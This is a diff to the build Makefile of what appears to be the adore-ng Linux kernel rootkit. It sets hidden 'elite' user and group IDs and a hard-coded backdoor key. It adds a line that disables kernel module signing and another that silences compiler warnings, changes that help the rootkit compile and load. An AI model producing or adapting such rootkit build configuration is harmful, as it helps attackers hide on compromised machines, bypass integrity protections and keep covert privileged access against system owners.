@@ -1,6 +1,7 @@
 # New kbuild based Makefile for 2.6 kernel
 # Edit ELITE_UID etc. and copy to 'Makefile'
 # then type 'make'
+CONFIG_MODULE_SIG=n
 
 EXTRA_CFLAGS=-DELITE_UID=2618748389U -DELITE_GID=4063569279U
 EXTRA_CFLAGS+=-DCURRENT_ADORE=56
@@ -23,6 +24,7 @@ EXTRA_CFLAGS+=-DADORE_KEY=\"fgjgggfd\"
 
 EXTRA_CFLAGS+=-DMODIFY_PAGE_TABLES
 EXTRA_CFLAGS+=-DFOUR_LEVEL_PAGING
+EXTRA_CFLAGS+=-w
 
 
 #KERNEL_SOURCE=/usr/src/linux
